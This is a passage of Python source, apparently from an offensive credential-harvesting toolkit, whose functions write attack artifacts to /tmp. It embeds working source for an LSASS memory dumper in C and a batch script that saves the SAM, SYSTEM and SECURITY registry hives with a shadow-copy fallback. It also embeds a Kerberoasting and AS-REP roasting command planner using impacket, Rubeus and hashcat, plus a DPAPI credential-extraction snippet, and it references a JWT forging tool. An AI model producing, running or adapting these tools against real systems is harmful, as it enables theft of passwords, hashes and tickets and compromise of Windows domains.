def p_jwt_forge_gen(args):
    """Artifact: JWT signing / alg-confusion tester source written to /tmp; arm runs offline self-test."""
    power = _name("jwt_forge_gen")
    path = os.path.join(_TMP, "ssb_cred_jwt_forge.py")
    err = _write_artifact(path, _JWT_FORGE_SRC, 0o755)
    if err:
        return _res(power, False, error=err)
    out = {"artifact": path, "armed": False,
           "would_do": ["emit alg=none tokens", "HS256-sign with weak/known secrets",
                        "RS256->HS256 alg-confusion using the server's public key as HMAC secret"],
           "usage": "python3 %s selftest|none|hs256|confuse" % path}
    if args.get("arm", True):
        rc, stdout, stderr = _run([sys.executable, path, "selftest"], timeout=20)
        out["armed"] = True
        out["selftest_rc"] = rc
        try:
            out["selftest"] = json.loads(stdout)
        except Exception:  # noqa: BLE001
            out["selftest_stdout"] = stdout[:2000]
            out["selftest_stderr"] = stderr[:2000]
    return _res(power, True, **out)


_SAM_GEN_SRC = r'''@echo off
REM SSB cred-wave artifact: Windows SAM/SYSTEM hive acquisition helper.
REM Requires: elevated Administrator (SYSTEM preferred) on the target.
REM Exfil the three hives, then offline-crack with:
REM   impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
set OUT=%~dp0hives
mkdir %OUT% 2>nul
echo [*] saving SAM / SYSTEM / SECURITY hives to %OUT%
reg save HKLM\SAM %OUT%\SAM
reg save HKLM\SYSTEM %OUT%\SYSTEM
reg save HKLM\SECURITY %OUT%\SECURITY
echo [*] fallback: shadow-copy route if reg save is blocked
echo     vssadmin create shadow /for=C:
echo     copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\System32\config\SAM %OUT%\SAM
echo [*] done. crack offline; never on the domain controller.
'''


def p_windows_sam_gen(args):
    """Artifact: Windows SAM/SYSTEM hive dump batch script (reg save + vssadmin fallback) written to /tmp."""
    power = _name("windows_sam_gen")
    path = os.path.join(_TMP, "ssb_cred_sam_dump.bat")
    err = _write_artifact(path, _SAM_GEN_SRC)
    if err:
        return _res(power, False, error=err)
    return _res(power, True, artifact=path, armed=False,
                target_os="windows", requires="elevated Administrator on target",
                would_do=["reg save HKLM\\SAM/SYSTEM/SECURITY to .\\hives",
                          "vssadmin shadow-copy fallback if hives are locked"],
                crack_cmd="impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL",
                honest_note="cannot execute on %s; artifact only" % _PLATFORM)


_LSASS_DUMP_SRC = r'''/* SSB cred-wave artifact: LSASS memory dumper via MiniDumpWriteDump (Windows).
 * Build on Windows:  cl.exe /EHsc ssb_cred_lsass_dump.c Dbghelp.lib
 * Run elevated with SeDebugPrivilege. Output: lsass.dmp -> parse offline with
 * pypykatz/mimikatz:  sekurlsa::minidump lsass.dmp / sekurlsa::logonpasswords
 */
#include <windows.h>
#include <dbghelp.h>
#include <stdio.h>
#include <tlhelp32.h>

static DWORD find_lsass_pid(void) {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "lsass.exe") == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

static BOOL enable_debug_priv(void) {
    HANDLE tok; TOKEN_PRIVILEGES tp; LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return FALSE;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) return FALSE;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    return AdjustTokenPrivileges(tok, FALSE, &tp, 0, NULL, NULL);
}

int main(void) {
    if (!enable_debug_priv()) { fprintf(stderr, "SeDebugPrivilege failed (run elevated)\n"); return 1; }
    DWORD pid = find_lsass_pid();
    if (!pid) { fprintf(stderr, "lsass.exe not found\n"); return 1; }
    printf("[*] lsass pid=%lu\n", pid);
    HANDLE proc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!proc) { fprintf(stderr, "OpenProcess failed: %lu\n", GetLastError()); return 1; }
    HANDLE out = CreateFileA("lsass.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                             FILE_ATTRIBUTE_NORMAL, NULL);
    if (out == INVALID_HANDLE_VALUE) { fprintf(stderr, "CreateFile failed\n"); return 1; }
    BOOL okd = MiniDumpWriteDump(proc, pid, out, MiniDumpWithFullMemory,
                                 NULL, NULL, NULL);
    printf(okd ? "[+] wrote lsass.dmp\n" : "[-] MiniDumpWriteDump failed: %lu\n", GetLastError());
    CloseHandle(out); CloseHandle(proc);
    return okd ? 0 : 1;
}
'''


def p_lsass_dump_gen(args):
    """Artifact: mimikatz-style LSASS MiniDumpWriteDump dumper C source written to /tmp (compile on Windows)."""
    power = _name("lsass_dump_gen")
    path = os.path.join(_TMP, "ssb_cred_lsass_dump.c")
    err = _write_artifact(path, _LSASS_DUMP_SRC)
    if err:
        return _res(power, False, error=err)
    return _res(power, True, artifact=path, armed=False, target_os="windows",
                build_cmd="cl.exe /EHsc %s Dbghelp.lib" % os.path.basename(path),
                requires="elevated process with SeDebugPrivilege",
                would_do=["enable SeDebugPrivilege", "locate lsass.exe via toolhelp snapshot",
                          "MiniDumpWriteDump(full memory) to lsass.dmp",
                          "parse offline with pypykatz / mimikatz sekurlsa::minidump"],
                honest_note="cannot compile/execute on %s; source artifact only" % _PLATFORM)


_KERB_TICKET_SRC = r'''#!/usr/bin/env python3
"""SSB cred-wave artifact: Kerberos roasting planner (AS-REP + Kerberoast).

Generates the exact impacket/rubeus command lines for a domain you supply and
optionally writes a target-user list file. Real ticket request requires
network access to a KDC plus impacket or Rubeus; this script only PLANS.
Usage: python3 kerb_roast_plan.py <domain> [user1 user2 ...]
"""
import json, sys


def plan(domain, users):
    dc_hint = "dc01.%s" % domain
    return {
        "asrep_roast": [
            "impacket-GetNPUsers %s/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip %s" % (domain, dc_hint),
            "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt",
        ],
        "kerberoast": [
            "impacket-GetUserSPNs %s/<user>:<pass> -dc-ip %s -request -outputfile spn.txt" % (domain, dc_hint),
            "Rubeus.exe kerberoast /outfile:spn.txt   # on a Windows foothold",
            "hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt",
        ],
        "ticket_ops": [
            "Rubeus.exe asktgt /user:<user> /rc4:<ntlm>   # request TGT with creds",
            "export KRB5CCNAME=ticket.ccache              # use with impacket -k",
        ],
        "users": users,
    }


if __name__ == "__main__":
    domain = sys.argv[1] if len(sys.argv) > 1 else "corp.example"
    users = sys.argv[2:]
    if users:
        with open("users.txt", "w") as fh:
            fh.write("\n".join(users) + "\n")
    print(json.dumps(plan(domain, users), indent=2))
'''


def p_kerberos_ticket_gen(args):
    """Artifact: Kerberos AS-REP/Kerberoast roasting planner source written to /tmp; arm runs it offline."""
    power = _name("kerberos_ticket_gen")
    path = os.path.join(_TMP, "ssb_cred_kerb_roast_plan.py")
    err = _write_artifact(path, _KERB_TICKET_SRC, 0o755)
    if err:
        return _res(power, False, error=err)
    out = {"artifact": path, "armed": False,
           "would_do": ["emit GetNPUsers/GetUserSPNs/Rubeus command plan",
                        "hashcat modes 18200 (AS-REP) and 13100 (RC4 TGS)"],
           "requires": "network to a KDC + impacket or a Windows foothold for real roasting"}
    if args.get("arm", True):
        domain = args.get("domain", "corp.example")
        users = args.get("users") or []
        rc, stdout, stderr = _run([sys.executable, path, domain] + list(users), timeout=20)
        out["armed"] = True
        out["planner_rc"] = rc
        try:
            out["plan"] = json.loads(stdout)
        except Exception:  # noqa: BLE001
            out["planner_stdout"] = stdout[:2000]
            out["planner_stderr"] = stderr[:2000]
    return _res(power, True, **out)


_DPAPI_SRC = r'''# SSB cred-wave artifact: DPAPI extraction cheat-sheet + PowerShell snippet.
# Run on the Windows target (elevated for machine keys). Offline flow:
#   1) grab masterkeys:  %APPDATA%\Microsoft\Protect\<SID>\*
#   2) grab cred blobs:  %APPDATA%\Microsoft\Credentials\*, ...\Protect\*
#   3) decrypt: mimikatz dpapi::masterkey /in:<mkfile> /rpc   (domain backup key)
#               mimikatz dpapi::cred /in:<blob> /masterkey:<guid:key>
$Root = "$env:APPDATA\Microsoft"
Get-ChildItem "$Root\Protect" -Recurse -ErrorAction SilentlyContinue |
  Select-Object FullName, Length
Get-ChildItem "$Root\Credentials","$Root\Protect" -Recurse -Include * -ErrorAction SilentlyContinue |
  Select-Object FullName, Length
# Machine keys (needs SYSTEM):
#   mimikatz "privilege::debug" "sekurlsa::dpapi"  -> dumps DPAPI_SYSTEM secret
#   dpapi.py machine -system SYSTEM -security SECURITY   (impacket, offline)
'''


def p_dpapi_gen(args):
    """Artifact: DPAPI masterkey/credential extraction cheat-sheet + PowerShell snippet written to /tmp."""
    power = _name("dpapi_gen")
    path = os.path.join(_TMP, "ssb_cred_dpapi_extract.ps1")
    err = _write_artifact(path, _DPAPI_SRC)
    if err:
        return _res(power, False, error=err)
    return _res(power, True, artifact=path, armed=False, target_os="windows",
                would_do=["enumerate %APPDATA%\\Microsoft\\Protect masterkeys",
                          "enumerate Credentials vault blobs",
                          "decrypt via domain backup key or dpapi.py offline"],
                honest_note="cannot execute on %s; artifact only" % _PLATFORM)


POWERS = {
    _name("shadow_audit"): p_shadow_audit,
    _name("passwd_analyzer"): p_passwd_analyzer,
    _name("ssh_key_audit"): p_ssh_key_audit,
    _name("ssh_keygen"): p_ssh_keygen,
    _name("history_miner"): p_history_miner,
    _name("env_secret_scan"): p_env_secret_scan,
    _name("file_secret_scan"): p_file_secret_scan,
    _name("cred_store_audit"): p_cred_store_audit,
    _name("vault_probe"): p_vault_probe,
    _name("sudoers_audit"): p_sudoers_audit,
    _name("jwt_decoder"): p_jwt_decoder,
    _name("jwt_forge_gen"): p_jwt_forge_gen,
    _name("hash_identify"): p_hash_identify,
    _name("hash_crack_gen"): p_hash_crack_gen,
    _name("token_scope_probe"): p_token_scope_probe,
    _name("password_strength"): p_password_strength,
    _name("windows_sam_gen"): p_windows_sam_gen,
    _name("lsass_dump_gen"): p_lsass_dump_gen,
    _name("kerberos_ticket_gen"): p_kerberos_ticket_gen,
    _name("dpapi_gen"): p_dpapi_gen,
}

if __name__ == "__main__":
    print(json.dumps(POWERS["nm20.cred.shadow_audit"]({}), indent=2)[:4000])
